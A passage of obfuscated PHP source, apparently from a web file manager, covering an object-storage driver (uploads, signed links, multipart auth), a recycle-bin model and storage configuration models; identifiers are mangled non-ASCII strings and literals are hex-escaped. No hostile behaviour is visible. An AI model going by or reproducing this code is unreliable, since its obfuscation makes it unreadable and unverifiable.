count(array_unique($£ƒ€¡∏˚)); return array($éÔ•¡„ü[217] => $†ÉÎıõ•, $éÔ•¡„ü[218] => $£ƒ€¡∏˚); } return !1; } public function listAll($ô∑πœéó) { $˛˜˚¸º¯ =& $_SERVER[Á≈ ä ∞]; $Àº¸»„… = $this->fileList($ô∑πœéó, $˛˜˚¸º¯[22], !0); $§¡ªÉπ˙ = array(); foreach ($Àº¸»„…[$˛˜˚¸º¯[93]] as $Œ∂ùﬁ§’) { $§¡ªÉπ˙[$Œ∂ùﬁ§’[$˛˜˚¸º¯[42]]] = $Œ∂ùﬁ§’[$˛˜˚¸º¯[86]]; } foreach ($Àº¸»„…[$˛˜˚¸º¯[92]] as $Œ∂ùﬁ§’) { if (is_string($Œ∂ùﬁ§’)) { $§¡ªÉπ˙[$Œ∂ùﬁ§’] = 0; } } return $this->listAllFiles($ô∑πœéó, array_keys($§¡ªÉπ˙), $§¡ªÉπ˙); } public function canRead($ñçÊ°îÊ) { $ÛûΩå´ó =& $_SERVER[Á≈ ä ∞]; $π˜ÖË√Ü = $this->client->getAccessControlPolicy($this->bucket, $ñçÊ°îÊ); if (!$π˜ÖË√Ü) { return !1; } return in_array($π˜ÖË√Ü, array($ÛûΩå´ó[219], $ÛûΩå´ó[220], $ÛûΩå´ó[221])) ? !0 : !1; } public function canWrite($ƒÊìª◊) { $“∆¶≈ƒ“ =& $_SERVER[Á≈ ä ∞]; $≠¶Ö≠¯π = $this->client->getAccessControlPolicy($this->bucket, $ƒÊìª◊); if (!$≠¶Ö≠¯π) { return !1; } return in_array($≠¶Ö≠¯π, array($“∆¶≈ƒ“[219], $“∆¶≈ƒ“[220])) ? !0 : !1; } public function getContent($Éî±√≠¶) { return $this->client->getObject($this->bucket, $Éî±√≠¶); } public function setContent($Ö÷∫ …–, $÷ÌôÙ≥Ø = '', $‰ûóº˝∂ = false) { $“Âóè≥« =& $_SERVER[Á≈ ä ∞]; $Ö÷∫ …– = $‰ûóº˝∂ ? trim($Ö÷∫ …–, $“Âóè≥«[18]) . $“Âóè≥«[18] : $Ö÷∫ …–; $Û™©—‚ = get_file_mime(get_path_ext($Ö÷∫ …–)); $ÓŒäõ™∫ = $this->client->putObject($÷ÌôÙ≥Ø, $this->bucket, $Ö÷∫ …–, $“Âóè≥«[208], array(), $Û™©—‚); if (!$ÓŒäõ™∫) { return !1; } if ($‰ûóº˝∂) { return !0; } $this->cacheMethod(null, null); $ÓŒäõ™∫ = $this->copyFile($Ö÷∫ …–, $Ö÷∫ …–, array($“Âóè≥«[222] => $ÓŒäõ™∫[$“Âóè≥«[223]])); return $ÓŒäõ™∫ ? !0 : !1; } public function fileSubstr($‡ë˚⁄ìï, $∑Å¢ªæ€, $≈™ãèµ¯) { $¥ˆ¨ê∑¿ = $∑Å¢ªæ€ + $≈™ãèµ¯ - 1; return $this->client->getObject($this->bucket, $‡ë˚⁄ìï, array($_SERVER[Á≈ ä ∞][224] => "\x62\171\x74\145\x73\75{$∑Å¢ªæ€}\55{$¥ˆ¨ê∑¿}")); } public function upload($∫Å√™‚Ø, $˙µ¬∞êº, $Ô‹óû‘π = false, $˚‰œæÈ” = REPEAT_REPLACE) { $≈µãæøî =& $_SERVER[Á≈ ä ∞]; $£Å•“‘ª = array($≈µãæøî[222] => @md5_file($˙µ¬∞êº)); $≈ÀÈÜËÇ = array($≈µãæøî[225] => get_file_mime(get_path_ext($∫Å√™‚Ø))); if (IO::size($˙µ¬∞êº) <= 1024 * 1024 * 200) { $‚ÕÆùû¡ = $this->client->putObjectFile($˙µ¬∞êº, $this->bucket, $∫Å√™‚Ø, $≈µãæøî[208], $£Å•“‘ª, $≈ÀÈÜËÇ); return !empty($‚ÕÆùû¡) ? $this->getPathOuter($∫Å√™‚Ø) : !1; } $ŸﬁíÍìó = $this->client->multiUploadObject($˙µ¬∞êº, $this->bucket, trim($∫Å√™‚Ø, $≈µãæøî[18]), $£Å•“‘ª, $≈ÀÈÜËÇ); return $ŸﬁíÍìó ? $this->getPathOuter($∫Å√™‚Ø) : !1; } public function download($Óã®ö∏ﬂ, $˚‰ﬂõá’) { if (!@is_dir($this->pathFather($˚‰ﬂõá’)) && !IO::mkdir($this->pathFather($˚‰ﬂõá’))) { return !1; } $º∞Øã§ê = $this->client->getObject($this->bucket, $Óã®ö∏ﬂ, array(), $˚‰ﬂõá’); return $º∞Øã§ê !== !1 ? $˚‰ﬂõá’ : !1; } public function link($¸éÛÜâ¸, $£ê∫±Éô = array()) { $íï§ºÎÍ =& $_SERVER[Á≈ ä ∞]; if ($this->signVer == $íï§ºÎÍ[226]) { return $this->client->getAuthenticatedURL($this->bucket, $¸éÛÜâ¸, 3600 * 12, $£ê∫±Éô); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($¸éÛÜâ¸, $íï§ºÎÍ[18]), 3600 * 12, $this->region, array(), !0, $£ê∫±Éô); } public function fileOut($æ®è èè, $∆®„ú√Î = false, $ìı‹˛≤« = false, $•«≈ÌëÜ = '') { $ôÀÿ°¢ =& $_SERVER[Á≈ ä ∞]; if ($this->isFileOutServer()) { return $this->fileOutServer($æ®è èè, $∆®„ú√Î, $ìı‹˛≤«, $•«≈ÌëÜ); } if (!$ìı‹˛≤«) { $ìı‹˛≤« = $this->pathThis($æ®è èè); } $÷¢—»ÎŒ = get_file_mime(get_path_ext($ìı‹˛≤«)); if ($÷¢—»ÎŒ == $ôÀÿ°¢[227]) { return parent::fileOut($æ®è èè, $∆®„ú√Î, $ìı‹˛≤«, $•«≈ÌëÜ); } $óÚ™ÂÏ≠ = array($ôÀÿ°¢[228] => $÷¢—»ÎŒ); if ($∆®„ú√Î) { $óÚ™ÂÏ≠[$ôÀÿ°¢[229]] = $ôÀÿ°¢[230] . rawurlencode($ìı‹˛≤«); } else { } $ûÏì†¢î = $this->link($æ®è èè, $óÚ™ÂÏ≠); $this->fileOutLink($ûÏì†¢î); } public function fileOutServer($êÿ≈¿≤∞, $‚Âü©⁄Ô = false, $æÀãê˜ƒ = false, $ò∑ß÷ßœ = '') { parent::fileOut($êÿ≈¿≤∞, $‚Âü©⁄Ô, $æÀãê˜ƒ, $ò∑ß÷ßœ); } public function fileOutImageServer($ç∞∑ øˆ, $âºıΩ∑Ω = 250) { parent::fileOutImage($ç∞∑ øˆ, $âºıΩ∑Ω); } public function hashMd5($Á—ˆ˜¥É, $Å¥®øÆˆ = '') { $÷πØ±Ì· =& $_SERVER[Á≈ ä ∞]; $ä”‰∫≤™ = $this->objectMeta($Á—ˆ˜¥É); if (!$ä”‰∫≤™) { return !1; } $Å¥®øÆˆ = $Å¥®øÆˆ ? $Å¥®øÆˆ : _get($ä”‰∫≤™, $÷πØ±Ì·[231]); $Å¥®øÆˆ = $Å¥®øÆˆ ? $Å¥®øÆˆ : _get($ä”‰∫≤™, $÷πØ±Ì·[223], $÷πØ±Ì·[22]); return $Å¥®øÆˆ; } public function uploadFormData($ã´Êœ’ñ, $Á¢õÊ©õ = 3600) { $Õ€Ùﬂ¶– =& $_SERVER[Á≈ ä ∞]; $öô¸ûø¡ = $this->pathFather($ã´Êœ’ñ); $∆´†”∫† = $this->client->getHttpUploadPostParams($this->bucket, $öô¸ûø¡, $Õ€Ùﬂ¶–[208], $Á¢õÊ©õ); return array_merge((array) $∆´†”∫†, array($Õ€Ùﬂ¶–[191] => $this->getHost())); } public function multiUploadFormData($û‡›¡¡≈, $∂ìﬂ˘˘¶ = 3600) { $∫í¨û™¡ =& $_SERVER[Á≈ ä ∞]; $€Ü∏ëÔ¸ = gmdate($∫í¨û™¡[232]); $ËÆ◊ËÕ¥ = array(); $˝ëíá≠‰ = $this->client->getUploadId($this->bucket, $û‡›¡¡≈, $ËÆ◊ËÕ¥); if (!$˝ëíá≠‰) { return !1; } return array($∫í¨û™¡[233] => $˝ëíá≠‰, $∫í¨û™¡[191] => $this->getHost() . $∫í¨û™¡[18] . $this->pathEncode($û‡›¡¡≈), $∫í¨û™¡[234] => $€Ü∏ëÔ¸, $∫í¨û™¡[104] => $û‡›¡¡≈); } public function multiUploadAuthData($öÏê–Ø‚, $∏¨≠¯®õ = array()) { $Ï–™¯∫Ï =& $_SERVER[Á≈ ä ∞]; $ùﬁ…è˘Â = isset($∏¨≠¯®õ[$Ï–™¯∫Ï[234]]) ? $∏¨≠¯®õ[$Ï–™¯∫Ï[234]] : gmdate($Ï–™¯∫Ï[232]); $ﬁ»îí∫ƒ = isset($∏¨≠¯®õ[$Ï–™¯∫Ï[184]]) ? $∏¨≠¯®õ[$Ï–™¯∫Ï[184]] : $Ï–™¯∫Ï[22]; $ˆ§µ•ôã = $∏¨≠¯®õ[$Ï–™¯∫Ï[104]]; unset($∏¨≠¯®õ[$Ï–™¯∫Ï[104]]); if (isset($∏¨≠¯®õ[$Ï–™¯∫Ï[235]])) { $∏¨≠¯®õ[$Ï–™¯∫Ï[234]] = $ùﬁ…è˘Â; return $this->listUploadParts($ˆ§µ•ôã, $∏¨≠¯®õ); } $¯∂œÿ©á = array($Ï–™¯∫Ï[236], $Ï–™¯∫Ï[22], $Ï–™¯∫Ï[130], $Ï–™¯∫Ï[22], "\x78\55\141\155\x7a\x2d\x64\x61\x74\x65\72{$ùﬁ…è˘Â}", $Ï–™¯∫Ï[18] . $this->bucket . $Ï–™¯∫Ï[18] . $this->pathEncode($ˆ§µ•ôã) . $ﬁ»îí∫ƒ); if (strpos($ﬁ»îí∫ƒ, $Ï–™¯∫Ï[237]) === 0) { $¯∂œÿ©á[0] = $Ï–™¯∫Ï[238]; } if (isset($∏¨≠¯®õ[$Ï–™¯∫Ï[239]]) && $∏¨≠¯®õ[$Ï–™¯∫Ï[239]] == $Ï–™¯∫Ï[240]) { $¯∂œÿ©á[0] = $Ï–™¯∫Ï[240]; } $ä››¿¯£ = implode($Ï–™¯∫Ï[11], $¯∂œÿ©á); $úùê≥ú° = base64_encode(hash_hmac($Ï–™¯∫Ï[241], $ä››¿¯£, $this->secret, !0)); $‡ÆÒ◊√º = $Ï–™¯∫Ï[242] . $this->accessKey . $Ï–™¯∫Ï[4] . $úùê≥ú°; if (strpos($ﬁ»îí∫ƒ, $Ï–™¯∫Ï[237]) === 0) { return array($Ï–™¯∫Ï[243] => $‡ÆÒ◊√º, $Ï–™¯∫Ï[234] => $ùﬁ…è˘Â); } return $‡ÆÒ◊√º; } public function listUploadParts($˙‡ÛØ‡, $æ‰Ñç¥· = array()) { $„ƒíº≤ñ =& $_SERVER[Á≈ ä ∞]; $Å∏¢¿÷≤ = str_replace($„ƒíº≤ñ[244], $„ƒíº≤ñ[22], $æ‰Ñç¥·[$„ƒíº≤ñ[184]]); $˛»ä›Æº = $this->client->listParts($this->bucket, $˙‡ÛØ‡, $Å∏¢¿÷≤); if (!$˛»ä›Æº) { return !1; } unset($æ‰Ñç¥·[$„ƒíº≤ñ[235]], $æ‰Ñç¥·[$„ƒíº≤ñ[239]]); $æ‰Ñç¥·[$„ƒíº≤ñ[104]] = $˙‡ÛØ‡; $ó·ëçò™ = $this->multiUploadAuthData($˙‡ÛØ‡, $æ‰Ñç¥·); if (empty($ó·ëçò™)) { return !1; } return array($„ƒíº≤ñ[243] => $ó·ëçò™, $„ƒíº≤ñ[234] => $æ‰Ñç¥·[$„ƒíº≤ñ[234]], $„ƒíº≤ñ[245] => $˛»ä›Æº); } public function getHost() { return parent::getHost() . $_SERVER[Á≈ ä ∞][18] . $this->bucket; } public function size($∫§ ´æ€) { $Äí◊‹∑‘ = $this->objectMeta($∫§ ´æ€); return $Äí◊‹∑‘ ? $Äí◊‹∑‘[$_SERVER[Á≈ ä ∞][86]] : 0; } public function info($à√°ú≠) { if ($this->isFolder($à√°ú≠)) { return $this->folderInfo($à√°ú≠); } else { if ($this->isFile($à√°ú≠)) { return $this->fileInfo($à√°ú≠); } } return !1; } public function exist($”¸£Ÿ∑›) { return $this->isFile($”¸£Ÿ∑›) || $this->isFolder($”¸£Ÿ∑›); } public function isFile($⁄Úå∑¡ı) { return !$this->isFolder($⁄Úå∑¡ı) && $this->objectMeta($⁄Úå∑¡ı); } public function isFolder($Æ¶îÆˆß) { return $this->cacheMethod($_SERVER[Á≈ ä ∞][175], $Æ¶îÆˆß); } protected function objectMeta($°ÀÕ¸§ù) { return $this->cacheMethod($_SERVER[Á≈ ä ∞][177], $°ÀÕ¸§ù); } protected function _objectMeta($ô¨¸ºóû) { $˜¿ÂùìÜ =& $_SERVER[Á≈ ä ∞]; $ô¨¸ºóû = rtrim($ô¨¸ºóû, $˜¿ÂùìÜ[18]); try { $åÇéÜá€ = $this->client->getObjectInfo($this->bucket, $ô¨¸ºóû); if (!isset($åÇéÜá€[$˜¿ÂùìÜ[231]]) && isset($åÇéÜá€[$˜¿ÂùìÜ[246]])) { $åÇéÜá€[$˜¿ÂùìÜ[231]] = $åÇéÜá€[$˜¿ÂùìÜ[246]]; } } catch (Exception $æÔ°Ø¬á) { $åÇéÜá€ = !1; } if (!$åÇéÜá€) { } return $åÇéÜá€; } protected function _isFolder($∂£Ω€‡”) { $âƒÈÛéÀ =& $_SERVER[Á≈ ä ∞]; $∂£Ω€‡” = rtrim($∂£Ω€‡”, $âƒÈÛéÀ[18]); if ($∂£Ω€‡” == $âƒÈÛéÀ[22] || $∂£Ω€‡” == $âƒÈÛéÀ[18]) { return !0; } $∏Ü§∂ÿû = $this->client->getBucket($this->bucket, $∂£Ω€‡”, null, 1); if (empty($∏Ü§∂ÿû[$âƒÈÛéÀ[214]])) { return !1; } $÷‰ı´Ñ∏ = $∏Ü§∂ÿû[$âƒÈÛéÀ[214]][0][$âƒÈÛéÀ[42]]; return stripos($÷‰ı´Ñ∏, $∂£Ω€‡” . $âƒÈÛéÀ[18]) === 0 ? !0 : !1; if (substr($÷‰ı´Ñ∏, -1) == $âƒÈÛéÀ[18]) { return !0; } if (get_path_this($÷‰ı´Ñ∏) == get_path_this($∂£Ω€‡”)) { return !1; } return !0; } } goto C÷ÊÒËÙ°á; BﬁùÂËŒàÈ: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\x75\162\143\x65\137\x72\145\143\x79\x63\x6c\x65"; protected $dataAuto = array(array("\143\x72\145\x61\x74\x65\124\x69\x6d\x65", "\x74\151\x6d\145", "\x69\x6e\x73\145\162\164", "\x66\165\x6e\x63\x74\x69\157\x6e")); public function listData($œ∆≠Ú›¿ = false) { $É⁄ﬁ§≈ =& $_SERVER[Á≈ ä ∞]; $œ∆≠Ú›¿ = $œ∆≠Ú›¿ ? $œ∆≠Ú›¿ : USER_ID; $¨ƒÜáΩé = $this->where(array($É⁄ﬁ§≈[1649] => $œ∆≠Ú›¿))->select(); return array_to_keyvalue($¨ƒÜáΩé, $É⁄ﬁ§≈[22], $É⁄ﬁ§≈[411]); } public function moveToRecycle($€•˛Í¥ß) { $—Ô§ò…Î =& $_SERVER[Á≈ ä ∞]; $ﬂÆ≤Ó¨Ó = Model($—Ô§ò…Î[1330]); $¯«∞¢ﬁà = $ﬂÆ≤Ó¨Ó->sourceInfo($€•˛Í¥ß); if (!$¯«∞¢ﬁà || $¯«∞¢ﬁà[$—Ô§ò…Î[440]] == $—Ô§ò…Î[98]) { return; } $®ºøØÒπ = array($—Ô§ò…Î[426] => $€•˛Í¥ß, $—Ô§ò…Î[1649] => USER_ID, $—Ô§ò…Î[595] => $¯«∞¢ﬁà[$—Ô§ò…Î[420]], $—Ô§ò…Î[596] => $¯«∞¢ﬁà[$—Ô§ò…Î[514]], $—Ô§ò…Î[599] => $¯«∞¢ﬁà[$—Ô§ò…Î[530]]); $this->add($®ºøØÒπ); $this->recycleMove($€•˛Í¥ß, 1); if ($¯«∞¢ﬁà[$—Ô§ò…Î[419]] == $—Ô§ò…Î[98]) { $ •˚ƒ∏É = array($—Ô§ò…Î[599] => array($—Ô§ò…Î[559], $¯«∞¢ﬁà[$—Ô§ò…Î[530]] . $€•˛Í¥ß . $—Ô§ò…Î[560])); $ﬂÆ≤Ó¨Ó->where($ •˚ƒ∏É)->setField($—Ô§ò…Î[440], 1); } } public function clear() { $this->remove(!1); } public function remove($Ò–Æ√∫∞ = false, $µ¥©ü¢≤ = false) { $˛Ôåº˙ =& $_SERVER[Á≈ ä ∞]; $µ¥©ü¢≤ = $µ¥©ü¢≤ ? $µ¥©ü¢≤ : USER_ID; $‚◊ﬁ“´Ω = Model($˛Ôåº˙[1330]); $…ÿøËäÉ = $this->listData($µ¥©ü¢≤); $Ò–Æ√∫∞ = $Ò–Æ√∫∞ === !1 ? !1 : $Ò–Æ√∫∞; $ØÙ…¨èµ = array(); foreach ($…ÿøËäÉ as $∞ıæáà®) { if ($Ò–Æ√∫∞ != !1 && !in_array($∞ıæáà®, $Ò–Æ√∫∞)) { continue; } $ó Ø∆’ê = $‚◊ﬁ“´Ω->sourceInfo($∞ıæáà®); $‚◊ﬁ“´Ω->remove($∞ıæáà®, !1); $äú’ÁÈ» = $ó Ø∆’ê[$˛Ôåº˙[420]] . $˛Ôåº˙[21] . $ó Ø∆’ê[$˛Ôåº˙[514]]; $ØÙ…¨èµ[$äú’ÁÈ»] = array($˛Ôåº˙[595] => $ó Ø∆’ê[$˛Ôåº˙[420]], $˛Ôåº˙[514] => $ó Ø∆’ê[$˛Ôåº˙[514]]); $this->where(array($˛Ôåº˙[411] => $∞ıæáà®))->delete(); } foreach ($ØÙ…¨èµ as $ˆê∆˘–ˆ) { $‚◊ﬁ“´Ω->targetSpaceUpdate($ˆê∆˘–ˆ[$˛Ôåº˙[420]], $ˆê∆˘–ˆ[$˛Ôåº˙[514]]); } } public function restore($’ÑıÀÃï = false) { $·øöè≥‰ = $this->listData(); $this->_restoreSource($·øöè≥‰, $’ÑıÀÃï); } public function removeUserAll($Åÿçû“√) { $this->remove(!1, $Åÿçû“√); } private function _restoreSource($˛ﬁ˚≈ˆ», $«Ü†ïú…) { $ÔÿËÎàô =& $_SERVER[Á≈ ä ∞]; $†Ô“ÉòÜ = Model($ÔÿËÎàô[1330]); $«Ü†ïú… = $«Ü†ïú… == !1 ? !1 : $«Ü†ïú…; if (!$˛ﬁ˚≈ˆ») { return !0; } $¢€¸√ÓÖ = array(); foreach ($˛ﬁ˚≈ˆ» as $∫úÏ‰ÊÔ) { if ($«Ü†ïú… != !1 && !in_array($∫úÏ‰ÊÔ, $«Ü†ïú…)) { continue; } $Ò≠òºÒÑ = $†Ô“ÉòÜ->sourceInfo($∫úÏ‰ÊÔ); $ïÉ≠Ú¬‰ = $†Ô“ÉòÜ->sourceInfo($Ò≠òºÒÑ[$ÔÿËÎàô[441]]); if ($ïÉ≠Ú¬‰[$ÔÿËÎàô[440]] == $ÔÿËÎàô[98]) { continue; } $†Ô“ÉòÜ->lockMoveStart($∫úÏ‰ÊÔ); $this->recycleMove($∫úÏ‰ÊÔ, 0); if ($Ò≠òºÒÑ[$ÔÿËÎàô[419]] == $ÔÿËÎàô[98]) { $≈¸ÏÑè˘ = array($ÔÿËÎàô[599] => array($ÔÿËÎàô[559], $Ò≠òºÒÑ[$ÔÿËÎàô[530]] . $∫úÏ‰ÊÔ . $ÔÿËÎàô[560])); $†Ô“ÉòÜ->where($≈¸ÏÑè˘)->setField($ÔÿËÎàô[440], 0); $this->restoreFolderChildren($∫úÏ‰ÊÔ, $˛ﬁ˚≈ˆ»); } $this->where(array($ÔÿËÎàô[411] => $∫úÏ‰ÊÔ))->delete(); $†Ô“ÉòÜ->folderSizeReset($Ò≠òºÒÑ[$ÔÿËÎàô[441]]); $¢€¸√ÓÖ[] = $Ò≠òºÒÑ[$ÔÿËÎàô[441]]; if ($Ò≠òºÒÑ[$ÔÿËÎàô[419]] == $ÔÿËÎàô[98]) { $¢€¸√ÓÖ[] = $∫úÏ‰ÊÔ; } $†Ô“ÉòÜ->lockMoveEnd($∫úÏ‰ÊÔ); } $†Ô“ÉòÜ->updateModifyTime($¢€¸√ÓÖ); } private function restoreFolderChildren($Ç¸ï¥Å®, $É˘÷áˆ†) { $ÿºäØõ◊ =& $_SERVER[Á≈ ä ∞]; $ç„ƒ´Ì = Model($ÿºäØõ◊[1330]); $‡¥øÕ∏• = array($ÿºäØõ◊[411] => array($ÿºäØõ◊[17], array())); foreach ($É˘÷áˆ† as $√ÿ¥í÷π) { if ($√ÿ¥í÷π == $Ç¸ï¥Å®) { continue; } if (!$ç„ƒ´Ì->isParentOf($Ç¸ï¥Å®, $√ÿ¥í÷π)) { continue; } $åÚ™©Ò¬ = $ç„ƒ´Ì->sourceInfo($√ÿ¥í÷π); if ($åÚ™©Ò¬[$ÿºäØõ◊[419]] == $ÿºäØõ◊[98]) { $‡¥øÕ∏•[] = array($ÿºäØõ◊[599] => array($ÿºäØõ◊[559], $åÚ™©Ò¬[$ÿºäØõ◊[530]] . $√ÿ¥í÷π . $ÿºäØõ◊[560])); } else { $‡¥øÕ∏•[$ÿºäØõ◊[411]][1][] = $√ÿ¥í÷π; } } if (!$‡¥øÕ∏•[$ÿºäØõ◊[411]][1]) { unset($‡¥øÕ∏•[$ÿºäØõ◊[411]]); } if (!$‡¥øÕ∏•) { return; } $‡¥øÕ∏•[$ÿºäØõ◊[411]][1] = array_unique($‡¥øÕ∏•[$ÿºäØõ◊[411]][1]); $‡¥øÕ∏•[$ÿºäØõ◊[1003]] = $ÿºäØõ◊[1928]; $ç„ƒ´Ì->where($‡¥øÕ∏•)->setField($ÿºäØõ◊[440], 1); } private function recycleMove($∆› ¡ïº, $¡èŸ¢íï = 1) { $∫©≠â”π =& $_SERVER[Á≈ ä ∞]; $ÕÓ®¨¯· = Model($∫©≠â”π[1330]); $◊¥˛Ççï = Model($∫©≠â”π[2139]); $ëô•’£Ê = array($∫©≠â”π[411] => $∆› ¡ïº); if ($¡èŸ¢íï) { $ÕÓ®¨¯·->where($ëô•’£Ê)->setField($∫©≠â”π[440], 1); $◊¥˛Ççï->eventRecycle($∆› ¡ïº, $∫©≠â”π[2140]); } else { $…°£∑üÿ = $ÕÓ®¨¯·->where($ëô•’£Ê)->find(); $µŒõ™≠¨ = $…°£∑üÿ[$∫©≠â”π[419]] == $∫©≠â”π[98]; $˜≤±úÌ• = $ÕÓ®¨¯·->fileNameAuto($…°£∑üÿ[$∫©≠â”π[441]], $…°£∑üÿ[$∫©≠â”π[42]], REPEAT_RENAME_FOLDER, $µŒõ™≠¨); if ($˜≤±úÌ• != $…°£∑üÿ[$∫©≠â”π[42]]) { $ÕÓ®¨¯·->rename($∆› ¡ïº, $˜≤±úÌ•); } $ÕÓ®¨¯·->where($ëô•’£Ê)->setField($∫©≠â”π[440], 0); $◊¥˛Ççï->eventRecycle($∆› ¡ïº, $∫©≠â”π[2141]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\155\56\163\157\165\162\143\x65\123\145\143\162\145\x74\114\151\x73\164"; public $field = array("\x73\157\165\x72\x63\145\111\x44", "\164\171\x70\145\111\104", "\143\x72\145\141\x74\x65\125\x73\145\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\x2e\x73\x74\157\x72\x61\147\145\114\151\x73\164"; public $field = array("\156\141\155\x65", "\163\151\x7a\145\115\x61\x78", "\x73\x79\x73\164\x65\155", "\x64\x65\x66\141\x75\x6c\x74", "\144\162\x69\166\145\x72", "\143\157\x6e\146\151\x67"); public function listData($ÓÇÆõªõ = false, $î±˙ÊÅª = "\155\157\x64\151\x66\171\x54\x69\x6d\145", $ª–≈òíŒ = false) { $æ¸πù∞ü =& $_SERVER[Á≈ ä ∞]; $˜òôäÇœ = parent::listData($ÓÇÆõªõ, $î±˙ÊÅª, $ª–≈òíŒ); if ($ÓÇÆõªõ) { return $˜òôäÇœ; } $ñîäÜÔ• = $this->ioSizeUseGet(array_to_keyvalue($˜òôäÇœ, $æ¸πù∞ü[22], $æ¸πù∞ü[408])); foreach ($˜òôäÇœ as $Ÿ»Ü´Äµ => $Ä€€›¬∏) { unset($˜òôäÇœ[$Ÿ»Ü´Äµ][$æ¸πù∞ü[16]]); $˜òôäÇœ[$Ÿ»Ü´Äµ][$æ¸πù∞ü[1819]] = isset($ñîäÜÔ•[$Ä€€›¬∏[$æ¸πù∞ü[408]]]) ? $ñîäÜÔ•[$Ä€€›¬∏[$æ¸πù∞ü[408]]] : 0; } return $˜òôäÇœ; } public function ioSizeUseGet($Ê©¡Ô∑◊) { $ä–∞é˝¨ =& $_SERVER[Á≈ ä ∞]; if (!$Ê©¡Ô∑◊) { return array(); } $ÂıÃ∞…Ÿ = $ä–∞é˝¨[2142] . implode($ä–∞é˝¨[60], $Ê©¡Ô∑◊); $¢Á›£ · = Cache::get($ÂıÃ∞…Ÿ); if ($¢Á›£ ·) { return $¢Á›£ ·; } $¶ÕÉÔ®± = array($ä–∞é˝¨[824] => $ä–∞é˝¨[408], $ä–∞é˝¨[2143] => $ä–∞é˝¨[86]); $Î∂˝ûçÎ = array($ä–∞é˝¨[824] => array($ä–∞é˝¨[17], $Ê©¡Ô∑◊)); $¢Á›£ · = Model($ä–∞é˝¨[796])->field($¶ÕÉÔ®±)->where($Î∂˝ûçÎ)->group($ä–∞é˝¨[824])->select(); $¢Á›£ · = array_to_keyvalue($¢Á›£ ·, $ä–∞é˝¨[408], $ä–∞é˝¨[86]); Cache::set($ÂıÃ∞…Ÿ, $¢Á›£ ·, 600); return $¢Á›£ ·; } public function getConfig($èÔ€ûäº) { $†ªÉµ‚– = parent::listData($èÔ€ûäº); return json_decode($†ªÉµ‚–[$_SERVER[Á≈ ä ∞][16]], !0); } public function update($ÏÎ¡ÉÎﬁ, $¨˙·¶˘≠) { $µÉÊ®∫⁄ =& $_SERVER[Á≈ ä ∞]; $à…π®¥ß = $¨˙·¶˘≠[$µÉÊ®∫⁄[42]]; $Æ∏£Ä‡Ü = array_to_keyvalue(parent::listData(), $µÉÊ®∫⁄[42]); if (isset($Æ∏£Ä‡Ü[$à…π®¥ß]) && $Æ∏£Ä‡Ü[$à…π®¥ß][$µÉÊ®∫⁄[408]] != $ÏÎ¡ÉÎﬁ) { return !1; } $this->checkPwd($ÏÎ¡ÉÎﬁ, $¨˙·¶˘≠); if (isset($¨˙·¶˘≠[$µÉÊ®∫⁄[2144]]) && $¨˙·¶˘≠[$µÉÊ®∫⁄[2144]] == $µÉÊ®∫⁄[98]) { $this->checkConfig($¨˙·¶˘≠); } unset($¨˙·¶˘≠[$µÉÊ®∫⁄[2144]]); $˚≈ñœ¶¯ = parent::update($ÏÎ¡ÉÎﬁ, $¨˙·¶˘≠); if ($˚≈ñœ¶¯ && $¨˙·¶˘≠[$µÉÊ®∫⁄[47]]) { $«≥ùé◊ë = 0; foreach ($Æ∏£Ä‡Ü as $æ˝¿˚˜©) { if ($æ˝¿˚˜©[$µÉÊ®∫⁄[47]] && $æ˝¿˚˜©[$µÉÊ®∫⁄[408]] != $ÏÎ¡ÉÎﬁ) { $«≥ùé◊ë = $æ˝¿˚˜©[$µÉÊ®∫⁄[408]]; parent::update($æ˝¿˚˜©[$µÉÊ®∫⁄[408]], array($µÉÊ®∫⁄[47] => 0)); } } $this->updateBackup($ÏÎ¡ÉÎﬁ, $«≥ùé◊ë); } return $˚≈ñœ¶¯; } public function add($ˆÿµ„√È) { $Å•Ôæä± =& $_SERVER[Á≈ ä ∞]; $Ë⁄÷√¯Ÿ = array_to_keyvalue(parent::listData(), $Å•Ôæä±[42]); if (isset($Ë⁄÷√¯Ÿ[$ˆÿµ„√È[$Å•Ôæä±[42]]])) { return !1; } $this->checkConfig($ˆÿµ„√È); $¸’™˙¡¿ = parent::insert($ˆÿµ„√È); if ($¸’™˙¡¿ && $ˆÿµ„√È[$Å•Ôæä±[47]]) { foreach ($Ë⁄÷√¯Ÿ as $˚ËãΩ∆∑) { if ($˚ËãΩ∆∑[$Å•Ôæä±[47]]) { parent::update($˚ËãΩ∆∑[$Å•Ôæä±[408]], array($Å•Ôæä±[47] => 0)); } } } return $¸’™˙¡¿; } public function updateBackup($Ä¢ˆ⁄÷ , $â»¸°¨å) { $°ë®â√≈ =& $_SERVER[Á≈ ä ∞]; if (!$â»¸°¨å) { return; } $˘ÿ°¿îﬂ = Model($°ë®â√≈[756])->config(); if ($˘ÿ°¿îﬂ[$°ë®â√≈[1628]] != $°ë®â√≈[98] || $˘ÿ°¿îﬂ[$°ë®â√≈[759]] != $â»¸°¨å) { return; } $Ú√µœ√© = Model($°ë®â√≈[777])->get($°ë®â√≈[787]); $Ú√µœ√© = json_decode($Ú√µœ√©, !0); if (!$Ú√µœ√©) { return; } $Ú√µœ√©[$°ë®â√≈[759]] = $Ä¢ˆ⁄÷ ; Model($°ë®â√≈[777])->set(array($°ë®â√≈[787] => $Ú√µœ√©)); } public function checkPwd($ÂéìÑíª, &$ëã˙œè™) { $î¸∞§ﬂ« =& $_SERVER[Á≈ ä ∞]; if (empty($ëã˙œè™[$î¸∞§ﬂ«[16]])) { return; } $Íµ¸≈…å = json_decode($ëã˙œè™[$î¸∞§ﬂ«[16]], !0); $Â™ﬁÒΩ = $î¸∞§ﬂ«[22]; $±ÏŒ≤Õ⁄ = array($î¸∞§ﬂ«[2145], $î¸∞§ﬂ«[2146], $î¸∞§ﬂ«[892]); foreach ($±ÏŒ≤Õ⁄ as $˝ì¢Ë√È) { if (isset($Íµ¸≈…å[$˝ì¢Ë√È])) { $Â™ﬁÒΩ = $˝ì¢Ë√È; break; } } if (!$Â™ﬁÒΩ) { return; } $®úÀ‰∞ï = $this->getConfig($ÂéìÑíª); $É©‘ñà› = $®úÀ‰∞ï[$Â™ﬁÒΩ]; $ﬁ«›€äÑ = $Íµ¸≈…å[$Â™ﬁÒΩ]; if ($ﬁ«›€äÑ == str_repeat($î¸∞§ﬂ«[198], 